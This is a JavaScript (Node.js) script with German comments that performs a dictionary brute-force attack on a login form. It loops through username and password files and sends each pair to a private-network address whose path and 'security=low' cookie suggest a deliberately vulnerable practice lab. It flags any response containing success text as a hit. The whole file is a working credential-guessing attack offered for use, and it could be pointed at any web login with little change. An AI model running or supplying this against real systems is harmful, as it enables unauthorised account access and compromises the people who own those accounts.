const fs = require('fs');
const fetch = require('node-fetch');

const url = "http://10.115.2.7:4280/vulnerabilities/brute/";  // Ziel-URL für Bruteforce-Angriff

// Lade Benutzernamen und Passwörter aus Dateien
const usernames = fs.readFileSync('username.txt', 'utf-8').split('\n').map(u => u.trim());
const passwords = fs.readFileSync('password.txt', 'utf-8').split('\n').map(p => p.trim());

const sessionID = "f76ceef6d6e1f0d95e17f39f9fec7c8e"; // Falls eine Session-ID notwendig ist

async function bruteForce() {
    console.log("🔄 Starte Bruteforce...");
    
    for (let user of usernames) {
        for (let pass of passwords) {
            console.log(`🔍 Teste Benutzer: ${user} mit Passwort: ${pass}`);
            try {
                let response = await fetch(
                    `http://10.115.2.7:4280/vulnerabilities/brute/?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&Login=Login#`,
                    {
                      method: "GET",
                      credentials: "include",
                      headers: {
                        Cookie: `PHPSESSID=${sessionID}; security=low`,
                      },
                    }
                );

                let text = await response.text();
                if (text.includes("You have logged in") || text.includes("password is correct") || text.includes("Welcome") || text.includes("Dashboard")) { 
                    console.log(`✅ Erfolg: Benutzer = ${user}, Passwort = ${pass}`);
                    return;
                } else {
                    console.log(`❌ Fehlversuch: ${user} / ${pass}`);
                }
            } catch (error) {
                console.error("❌ Fehler bei der Anfrage:", error);
            }
        }
    }
    console.log("❌ Bruteforce beendet. Kein erfolgreiches Login gefunden.");
}

bruteForce();